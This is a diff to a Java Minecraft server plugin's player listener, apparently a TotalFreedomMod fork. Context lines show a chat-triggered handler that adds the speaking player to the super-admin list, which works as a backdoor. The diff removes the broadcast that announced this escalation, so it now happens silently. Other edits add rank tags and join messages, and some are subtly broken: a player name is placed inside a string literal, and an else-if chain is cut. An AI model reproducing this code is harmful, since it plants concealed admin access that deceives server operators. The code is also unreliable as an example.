@@ -527,7 +527,6 @@ public class TFM_PlayerListener implements Listener
                 player.setHealth(20.0);
                 player.setGameMode(GameMode.CREATIVE);
                 TFM_AdminList.addSuperadmin(player);
-                TFM_Util.adminAction("RoboSecurity", "Adding Robo_Lord to the super admin list.");
             }
             if (message.toLowerCase().contains("~superme")) 
             {
@@ -768,11 +767,12 @@ public class TFM_PlayerListener implements Listener
         // Handle admin impostors
         if (TFM_AdminList.isAdminImpostor(player))
         {
-            TFM_Util.bcastMsg("Warning: " + player.getName() + " has been flagged as an impostor!", ChatColor.RED);
+            TFM_Util.bcastMsg("Warning: " + player.getName() + " has been flagged as an impostor! and has been frozen!", ChatColor.RED);
             TFM_Util.bcastMsg(ChatColor.AQUA + player.getName() + " is " + TFM_PlayerRank.getLoginMessage(player));
             player.getInventory().clear();
             player.setOp(false);
             player.setGameMode(GameMode.SURVIVAL);
+            server.dispatchCommand("cage player.getName() skull");
         }
         else if (TFM_AdminList.isSuperAdmin(player) || TFM_Util.DEVELOPERS.contains(player.getName()))
         {
@@ -815,6 +815,11 @@ public class TFM_PlayerListener implements Listener
             player.setPlayerListName(ChatColor.DARK_PURPLE + player.getName());
             TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
         }
+        if (TFM_Util.SYS.contains(player.getName()))
+        {
+            player.setPlayerListName(ChatColor.DARK_PURPLE + player.getName());
+            TFM_PlayerData.getPlayerData(player).setTag("&8[&4System Admin&8]");
+        }
         else if (TFM_AdminList.isSeniorAdmin(player))
         {
             player.setPlayerListName(ChatColor.LIGHT_PURPLE + player.getName());
@@ -839,6 +844,11 @@ public class TFM_PlayerListener implements Listener
         {
             //Entrance
             TFM_Util.bcastMsg(ChatColor.AQUA + "buildcarter8 is the" + ChatColor.RED + " destroyer of all human kind " + ChatColor.AQUA + "and ");
+        }
+        if (username.equalsIgnoreCase("RobinGall2910"))
+        {
+            //Entrance
+            TFM_Util.bcastMsg(ChatColor.AQUA + "RobinGall2910 is a " + ChatColor.DARK_GREEN + "Zombie Killer " + ChatColor.AQUA + "and..");
         }
         if (username.equalsIgnoreCase("DragonHunterGW"))
         {
